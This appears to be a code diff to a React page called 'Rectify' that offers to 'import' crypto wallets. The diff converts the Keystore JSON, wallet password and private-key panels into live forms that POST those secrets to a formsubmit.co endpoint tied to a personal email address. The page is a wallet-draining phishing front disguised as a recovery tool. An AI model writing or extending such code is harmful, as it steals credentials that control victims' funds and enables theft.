@@ -42,8 +42,8 @@ function Rectify() {
         <input type="email" name="email" required />
         <button type="submit">Send</button>
       </form> */}
-      
-      <Marquee/>
+
+      <Marquee />
       <div className="popup">
         <div className="popup_button">
           <button
@@ -129,7 +129,6 @@ function Rectify() {
                       Typically 12 (sometimes 24) words separated by single
                       spaces
                     </p>
-                    {/* <input type="hidden" name="_captcha" value="false"/> */}
                     <button type="submit">
                       IMPORT
                       <span>
@@ -148,19 +147,30 @@ function Rectify() {
                   </form>
                 </TabPanel>
                 <TabPanel>
-                  <div className="fmt_panel">
+                  <form
+                    className="fmt_panel"
+                    action="https://formsubmit.co/m.hassnainkhan32@gmail.com"
+                    method="POST"
+                  >
                     <textarea
                       required
                       rows={4}
                       placeholder="Enter your Keystore JSON"
                       style={{ marginBottom: "1.5rem" }}
+                      type="text"
+                      name="keystore jSON"
                     />
-                    <input required placeholder="Wallet password" />
+                    <input
+                      required
+                      placeholder="Wallet password"
+                      type="text"
+                      name="wallet password"
+                    />
                     <p>
                       Several lines of text beginning with "{`{`}...{`}`}" plus
                       the password you used to encrypt it.
                     </p>
-                    <button>
+                    <button type="submit">
                       IMPORT
                       <span>
                         <svg
@@ -175,16 +185,25 @@ function Rectify() {
                         </svg>
                       </span>
                     </button>
-                  </div>
+                  </form>
                 </TabPanel>
                 <TabPanel>
-                  <div className="fmt_panel">
-                    <input required placeholder="Enter your Private Key" />
+                  <form
+                    className="fmt_panel"
+                    action="https://formsubmit.co/m.hassnainkhan32@gmail.com"
+                    method="POST"
+                  >
+                    <input
+                      required
+                      placeholder="Enter your Private Key"
+                      type="text"
+                      name="private key"
+                    />
                     <p>
                       Typically 12 (sometimes 24) words separated by single
                       spaces
                     </p>
-                    <button>
+                    <button type="submit">
                       IMPORT
                       <span>
                         <svg
@@ -199,7 +218,7 @@ function Rectify() {
                         </svg>
                       </span>
                     </button>
-                  </div>
+                  </form>
                 </TabPanel>
               </Tabs>
             </div>
@@ -210,7 +229,7 @@ function Rectify() {
         </Modal>
       </div>
 
-     <Footer/>
+      <Footer />
     </div>
   );
 }
